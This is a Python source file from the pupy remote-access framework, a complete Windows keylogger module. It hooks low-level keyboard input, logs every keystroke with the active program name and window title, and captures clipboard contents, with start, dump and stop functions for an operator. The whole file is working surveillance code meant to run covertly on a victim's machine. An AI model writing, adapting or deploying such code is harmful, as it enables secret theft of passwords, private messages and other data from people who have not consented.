# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
#coding: utf-8
import sys

from ctypes import *
from ctypes.wintypes import *

import threading
import time
import datetime
import platform
import os
import pupy

# Base windows types
#LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
#WPARAM  = c_uint
#LPARAM  = c_long
ULONG_PTR = WPARAM
LRESULT = LPARAM
LPMSG = POINTER(MSG)

HANDLE  = c_void_p
HHOOK   = HANDLE
HKL     = HANDLE
ULONG_PTR = WPARAM

HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

# Base constans
# https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
WM_KEYDOWN      = 0x0100
WM_KEYUP        = 0x0101
WM_SYSKEYDOWN   = 0x0104
WM_SYSKEYUP     = 0x0105
WH_KEYBOARD_LL  = 13
VK_TAB          = 0x09 # TAB key
VK_CAPITAL      = 0x14 # CAPITAL key
VK_SHIFT        = 0x10 # SHIFT key
VK_CONTROL      = 0x11 # CTRL key
VK_MENU         = 0x12 # ALT key
VK_LMENU        = 0xA4 # ALT key
VK_RMENU        = 0xA5 # ALT+GR key
VK_RETURN       = 0x0D # ENTER key
VK_ESCAPE       = 0x1B

#some windows function defines :

GetModuleHandleW = kernel32.GetModuleHandleW
GetModuleHandleW.restype = HMODULE
GetModuleHandleW.argtypes = [LPCWSTR]

SetWindowsHookEx = user32.SetWindowsHookExW
SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
SetWindowsHookEx.restype = HHOOK

UnhookWindowsHookEx = user32.UnhookWindowsHookEx
CallNextHookEx      = user32.CallNextHookEx
GetMessageW         = user32.GetMessageW
GetKeyboardState    = user32.GetKeyboardState
GetKeyboardLayout   = user32.GetKeyboardLayout
ToUnicodeEx         = user32.ToUnicodeEx
ToAsciiEx           = user32.ToAsciiEx

SetTimer            = user32.SetTimer
SetTimer.restype    = ULONG_PTR
SetTimer.argtypes   = (HWND, ULONG_PTR, UINT, c_void_p)

KillTimer           = user32.KillTimer
KillTimer.restype   = BOOL
KillTimer.argtypes  = (HWND, ULONG_PTR)

GetKeyState         = user32.GetKeyState

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.restype = DWORD
GetWindowThreadProcessId.argtypes = (HWND, POINTER(DWORD))

GetForegroundWindow = user32.GetForegroundWindow

CallNextHookEx.restype = LRESULT
CallNextHookEx.argtypes = (HHOOK,  # _In_opt_ hhk
                                    c_int,  # _In_     nCode
                                    WPARAM, # _In_     wParam
                                    LPARAM) # _In_     lParam

GetMessageW.argtypes = (LPMSG, # _Out_    lpMsg
                                HWND,  # _In_opt_ hWnd
                                UINT,  # _In_     wMsgFilterMin
                                UINT)  # _In_     wMsgFilterMax

# Macros
LOWORD = lambda x: x & 0xffff

# Base structures
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ('vkCode',      DWORD),
        ('scanCode',    DWORD),
        ('flags',       DWORD),
        ('time',        DWORD),
        ('dwExtraInfo', ULONG_PTR)
    ]

# Function prototypes
LOWLEVELKEYBOARDPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)

def keylogger_start():
    if pupy.manager.active(KeyLogger):
        return False

    try:
        keyLogger = pupy.manager.create(KeyLogger)
    except:
        return False

    return True

def keylogger_dump():
    keylogger = pupy.manager.get(KeyLogger)
    if keylogger:
        return keylogger.results

def keylogger_stop():
    keylogger = pupy.manager.get(KeyLogger)
    dump = ''
    if keylogger:
        pupy.manager.stop(KeyLogger)
        return keylogger.results

class KeyLogger(pupy.Task):
    results_type = unicode

    def __init__(self, *args, **kwargs):
        super(KeyLogger, self).__init__(*args, **kwargs)
        self.hooked = None
        self.pointer = None
        self.last_windows = None
        self.last_clipboard = ""

    def append(self, k):
        if type(k) == unicode:
            super(KeyLogger, self).append(k)
        else:
            try:
                super(KeyLogger, self).append(k.decode('utf-8'))
            except:
                # super(KeyLogger, self).append('{H:'+k.encode('hex')+'}')
                pass

    def task(self):
        self.install_hook()
        msg = MSG()
        timer = SetTimer(0, 0, 1000, 0)
        while self.active:
            GetMessageW(byref(msg), 0, 0, 0)
        KillTimer(0, timer)
        self.uninstall_hook()

    def install_hook(self):
        self.pointer = HOOKPROC(self.hook_proc)
        modhwd = GetModuleHandleW(None)
        self.hooked = SetWindowsHookEx(WH_KEYBOARD_LL, self.pointer, modhwd, 0)
        if not self.hooked:
            raise WinError()
        return True

    def uninstall_hook(self):
        if self.hooked is None:
            return
        UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def hook_proc(self, nCode, wParam, lParam):
        # The keylogger callback
        if LOWORD(wParam) != WM_KEYUP and LOWORD(wParam) != WM_SYSKEYUP:
            return CallNextHookEx(self.hooked, nCode, wParam, lParam)

        keyState = (BYTE * 256)()
        buff = (WCHAR * 256)()
        kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)
        hooked_key = ""
        specialKey = ""
        # index of the keystate : http://wiki.cheatengine.org/index.php?title=Virtual-Key_Code
        # ESCAPE
        if GetKeyState(VK_ESCAPE) & 0x8000:
            specialKey = '[ESCAPE]'

        # SHIFT
        if GetKeyState(VK_SHIFT) & 0x8000:
            keyState[16] = 0x80;

        # CTRL
        if GetKeyState(VK_CONTROL) & 0x8000:
            keyState[17] = 0x80;

        # ALT
        if GetKeyState(VK_MENU) & 0x8000:
            keyState[18] = 0x80;

        if kbdllhookstruct.vkCode == VK_TAB:
            specialKey = '[TAB]'

        elif kbdllhookstruct.vkCode == VK_RETURN:
            specialKey = '[RETURN]'

        pid = DWORD()
        tid = GetWindowThreadProcessId(GetForegroundWindow(), byref(pid))
        hKl = GetKeyboardLayout(tid)
        GetKeyboardState(byref(keyState))

        #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
        r = ToUnicodeEx(
            kbdllhookstruct.vkCode,
            kbdllhookstruct.scanCode,
            byref(keyState),
            byref(buff),
            256,
            0,
            hKl
        )

        if r == 0:
            r = ToAsciiEx(
                kbdllhookstruct.vkCode,
                kbdllhookstruct.scanCode,
                byref(keyState),
                byref(buff),
                0,
                0
            )

        if r==0: #nothing written to the buffer
            try:
                hooked_key = chr(kbdllhookstruct.vkCode)
            except:
                hooked_key = "0x%s"%kbdllhookstruct.vkCode
        else:
            hooked_key = buff.value.encode('utf8')

        if specialKey:
            hooked_key = specialKey

        exe, win_title = "unknown", "unknown"
        try:
            exe, win_title = get_current_process()
        except Exception:
            pass

        if self.last_windows!=(exe, win_title):
            self.append(
                '\n%s: %s %s\n'%(
                    datetime.datetime.now(),
                    str(exe).encode('string_escape'),
                    str(win_title).encode('string_escape')))
            self.last_windows=(exe, win_title)

        paste=""

        try:
            paste = winGetClipboard()
        except Exception:
            pass

        if paste and paste != self.last_clipboard:
            try:
                self.append(u'\n<clipboard>{}</clipboard>\n'.format(paste.strip()))
            except:
                self.append(u'\n<clipboard>{}</clipboard>\n'.format(repr(paste)[2:-1]))
            self.last_clipboard = paste

        self.append(hooked_key)
        return CallNextHookEx(self.hooked, nCode, wParam, lParam)

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
    hwnd = GetForegroundWindow()

    pid = c_ulong(0)
    GetWindowThreadProcessId(hwnd, byref(pid))

    #process_id = "%d" % pid.value

    executable = create_string_buffer('\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    window_title = create_string_buffer('\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    return executable.value, window_title.value

##http://nullege.com/codes/show/src%40t%40h%40thbattle-HEAD%40src%40utils%40pyperclip.py/48/ctypes.windll.user32.OpenClipboard/python
def winGetClipboard(): #link above is multiplatform, this can easily expand if keylogger becomes multiplatform
    windll.user32.OpenClipboard(0)
    pcontents = windll.user32.GetClipboardData(13) # CF_UNICODETEXT
    data = c_wchar_p(pcontents).value
    windll.user32.CloseClipboard()
    return data
